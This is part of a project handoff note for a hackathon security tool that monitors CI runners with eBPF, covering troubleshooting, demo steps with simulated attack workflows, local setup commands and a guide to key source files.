| PASS but `hostname:""` | Reverse DNS didn't resolve (common for CDN IPs) | Harmless — not a bug |
| `clang: not found` | Step 1 didn't install build deps | Re-run step 1 |
| `go: command not found` | Step 2 didn't update PATH in current shell | `source ~/.bashrc` or open new terminal |

---

## After All Code Done — Get To Demo

The build plan (`citadel-build-plan.md`) has phase-by-phase Claude Code prompts. Pattern that's worked:

1. Paste the prompt for the next single file/sub-phase (the prompts are file-scoped on purpose).
2. Validate before moving on.
3. When a prompt fails, feed the exact error back — don't restart.

All four service Dockerfiles + the composite action + the three attack workflows + the demo script are written. To go from "code complete" to "live demo":

1. **Linux runner ready** — Ubuntu 22.04, registered as a self-hosted runner labeled `citadel-runner`. Generate `agent/bpf/vmlinux.h` on that exact kernel (`sudo bpftool btf dump file /sys/kernel/btf/vmlinux format c > agent/bpf/vmlinux.h`) and commit it.
2. **Build images locally** on the runner — `make local-images`.
3. **Bring up backend + detector + dashboard** — `make docker-up`. Visit `http://<runner>:3000`.
4. **Trigger an attack** — `gh workflow run attack-1-exfil.yml` (then `attack-2-revshell.yml`, `attack-3-tamper.yml`).
5. **Watch the dashboard.** New run appears in `/runs`. Click in. Detections show in the sidebar within ~2 s (detector poll interval).
6. **Reset between rehearsals** — `make demo-reset`.

`docs/DEMO.md` has the 5-minute beat-by-beat script with exact commands and what the audience should see at each moment.

**Stand up the stack locally on Mac and watch it work end-to-end** (agent excluded — eBPF needs Linux):

```sh
# Terminal 1 — backend
cd backend && go build -o bin/citadel-backend ./cmd/backend
./bin/citadel-backend --addr=:8080 --db-path=/tmp/citadel.db

# Terminal 2 — detector (in a venv)
cd detector && python3 -m venv .venv && . .venv/bin/activate
pip install fastapi 'uvicorn[standard]>=0.27' httpx 'pydantic>=2.6' python-dateutil pyyaml
BACKEND_URL=http://localhost:8080 BASELINE_PATH=/tmp/citadel-baseline.json STATE_PATH=/tmp/citadel-state.json \
  uvicorn app.main:app --host 0.0.0.0 --port 8000

# Terminal 3 — dashboard
cd dashboard && npm run dev
# Open http://localhost:3000 — points at the backend via NEXT_PUBLIC_BACKEND_URL=http://localhost:8080 (set in .env.local if needed)

# Terminal 4 — exercise it
cd "/Users/mrkete/learning/Hackathon 2026"
./agent/bin/citadel-agent snapshot --path /tmp/ctest --out /tmp/before.json
echo "tampered" >> /tmp/ctest/sample.go
./agent/bin/citadel-agent diff --before /tmp/before.json --after-path /tmp/ctest --backend-url=http://localhost:8080
curl localhost:8000/stats   # detector should have seen at least one event
curl localhost:8080/api/runs | jq .
```

The real eBPF demo still needs the agent running on Linux with `sudo make build-agent && sudo ./bin/citadel-agent run --backend-url=…`.

---

## Files Worth Reading First In a New Session

1. `citadel-build-plan.md` — the master plan
2. This file (`HANDOFF.md`) — current state
3. `agent/internal/events/event.go` — **THE wire format** between agent ↔ backend ↔ detector ↔ dashboard
4. `agent/bpf/{net,proc,file,block}.bpf.c` — four eBPF programs
5. `agent/internal/probes/{net,proc,file,block}/*.go` — four Go loaders
6. `agent/internal/policy/policy.go` + `agent/internal/enforcer/enforcer.go` — Phase 8 policy + kill
7. `agent/cmd/agent/main.go` — agent entrypoint with full flag set + signal handling
8. `backend/internal/api/{router,events,runs,detections,policies}.go` — 10 HTTP endpoints
9. `detector/app/{engine,worker}.py` — rule dispatcher + polling loop
10. `detector/app/rules/*.py` — 5 detection rules (one per file)
11. `dashboard/app/runs/[id]/page.tsx` — the run-detail view (where judges spend their attention)

---

*Last updated: end of Phase 10. **All 11 phases (0–10) code-complete.** Phase 5 (backend) and Phase 7 (dashboard) verified end-to-end on Mac. Phases 1–4, 6, 8 require a Linux runner with eBPF to validate. Phase 9 + 10 (composite action, attack workflows, demo script) require the runner + the local images.*
